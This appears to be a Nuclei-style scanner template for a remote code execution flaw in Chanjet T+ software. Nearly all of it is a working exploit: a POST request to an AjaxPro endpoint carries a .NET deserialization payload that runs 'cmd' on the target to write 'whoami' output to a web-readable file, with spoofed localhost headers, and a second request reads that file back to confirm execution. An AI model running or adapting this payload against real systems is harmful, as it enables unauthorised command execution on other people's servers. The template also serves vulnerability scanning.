id: changjietong-GetStoreWarehouseByStore-rce
info:
  author: changjietong-GetStoreWarehouseByStore-rce
  name: changjietong-GetStoreWarehouseByStore-rce
requests:
  - raw:
      - |
        POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
        X-Ajaxpro-Method: GetStoreWarehouseByStore
        Host: {{Hostname}}
        X-Originating-IP: 127.0.0.1
        X-Forwarded-For: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        Content-Type: application/x-www-form-urlencoded

        {
          "storeID":{
            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
            "MethodName":"Start",
            "ObjectInstance":{
            "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "StartInfo":{
              "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
              "FileName":"cmd",
              "Arguments":"/c whoami > cnvd.txt  &&  set /a  255*255  >> cnvd.txt"
            }
            }
          }
        }

      - |
        GET /tplus/cnvd.txt HTTP/1.1
        Host: {{Hostname}}
        X-Originating-IP: 127.0.0.1
        X-Forwarded-For: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
        Connection: close



    matchers:
      - type: dsl
        dsl:
          - "contains(body_2,'65025')"

    extractors:
      - type: dsl
        dsl:
          - "body_2"



